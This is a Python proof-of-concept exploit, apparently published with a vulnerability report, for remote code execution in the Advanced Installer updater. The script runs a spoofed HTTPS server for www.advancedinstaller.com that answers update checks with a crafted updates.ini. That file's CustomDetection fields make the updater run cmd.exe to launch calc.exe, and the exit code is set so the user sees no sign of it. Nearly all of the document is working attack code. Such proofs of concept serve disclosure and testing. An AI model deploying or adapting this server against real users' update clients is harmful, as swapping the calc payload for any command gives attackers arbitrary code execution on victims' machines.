#!/usr/bin/env python3
# Proof of concept script for Caphyon Ltd Advanced Installer "CustomDetection" Update Check Remote Code Execution Vulnerability
# See report for details.
#
# Generate self-signed certificate using e.g.
# > openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj "/CN=www.advancedinstaller.com"
#
# Author: Gerr.re
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl

# CustomDetection with CustomDetectionParams is executed after receiving the response.
# Note that we set exitcode != 0 s.t. the updater thinks there is no new update (so no visual feedback on exploit).
updateconfig = b''';aiu;

[Update]
Name = Caphyon Ltd Advanced Updater CustomDetection Update Check Remote Code Execution Vulnerability
URL = http://example.com/doesnotmatter
Size = 1024
CustomDetection = c:\windows\system32\cmd.exe
CustomDetectionParams = /c "c:\windows\system32\calc.exe && exit 1"
'''

class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "updates.ini" in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(updateconfig)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    print("Running Server")

    try:
        httpd = HTTPServer(("0.0.0.0", 443), HTTPHandler)
        httpd.socket = ssl.wrap_socket(httpd.socket,
                                server_side=True,
                                certfile='www.advancedinstaller.com.pem',
                                ssl_version=ssl.PROTOCOL_TLS)
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()